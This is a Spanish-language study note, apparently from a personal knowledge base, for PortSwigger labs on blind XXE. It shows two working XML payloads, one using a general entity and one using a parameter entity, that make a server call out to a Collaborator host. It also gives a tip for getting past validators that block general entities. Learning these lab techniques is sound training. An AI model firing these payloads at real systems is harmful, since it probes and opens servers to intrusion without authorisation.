---
aliases:
  - XXE 005 - callback OOB
  - blind xxe collaborator
  - xxe parameter entities
tags:
  - vuln/xxe
  - example
  - portswigger
---

# 005 — XXE ciego: callback OOB con Collaborator

> Labs: [Blind XXE with OOB interaction](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction) · [via parameter entities](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities) · **Practitioner** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

## ¿Por qué acá? (empieza lo ciego)
- **Vengo de [[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band|001]]:** ahí el contenido **volvía reflejado** en la respuesta.
- **Por qué no me alcanza:** acá la respuesta **no refleja nada** (ciego). No veo el resultado → ni siquiera sé si hay XXE.
- **Entonces:** fuerzo un **callback OOB** a mi Collaborator para **confirmar** que el parser resuelve mi entidad. Todavía **no extraigo datos**, solo confirmo.
- **Sub-problema:** si el parser **bloquea entidades generales externas** (`&`), subo a **entidad de parámetro** (`%`) — el primer bypass de la escalera.

## Cómo explotarlo
**Escalón 1 — entidad general externa:**
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLAB.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

**Escalón 2 — si el 1 no dispara** (bloquea entidades **generales**), entidad de parámetro (`%`):
```http
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLAB.oastify.com"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Verificación
Burp → pestaña **Collaborator** → **Poll now** → interacciones **DNS + HTTP** = XXE ciego confirmado.

## Detalles que se pasan por alto
- **`%xxe;` va DENTRO del DTD** (corchetes del DOCTYPE) y se dispara **al declararse** — no hace falta referenciarlo en `productId`. La general (`&xxe;`) **sí** hay que ponerla en el cuerpo.
- Regla: **si `&` no dispara → probá `%`.** Es el bypass de validadores más común.
- El payload de Collaborator lo copiás con "Copy to clipboard".

→ **Siguiente:** ya confirmé que hay XXE ciego, pero fue **solo un ping**. ¿Cómo me llevo el **contenido**? → [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006 — exfiltrar con DTD externo]].
